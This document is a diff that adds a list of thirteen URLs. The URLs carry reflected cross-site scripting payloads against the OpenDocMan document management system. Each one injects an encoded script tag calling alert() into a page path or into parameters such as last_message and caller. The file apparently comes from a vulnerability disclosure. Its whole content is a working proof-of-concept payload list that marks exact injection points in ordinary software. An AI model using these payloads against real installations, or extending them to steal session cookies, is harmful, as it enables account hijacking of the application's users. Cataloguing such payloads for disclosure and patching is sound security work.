@@ -1,0 +1,14 @@
+http://www.example.com/opendocman/category.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;?aku=c3VibWl0PWFkZCZzdGF0ZT0y
+http://www.example.com/opendocman/department.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI=
+http://www.example.com/opendocman/profile.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/rejects.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/search.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/toBePublished.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/user.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;?aku=c3VibWl0PXNob3dwaWNrJnN0YXRlPTI=
+http://www.example.com/opendocman/view_file.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;?aku=aWQ9NiZzdGF0ZT0z
+http://www.example.com/opendocman/index.php?last_message=&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/user.php?submit=Modify+User&amp;item=2&amp;caller=/opendocman/&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;&quot;
+http://www.example.com/opendocman/add.php?last_message=&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/toBePublished.php?last_message=&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/opendocman/admin.php?last_message=&lt;script&gt;alert(1)&lt;/script&gt;
+
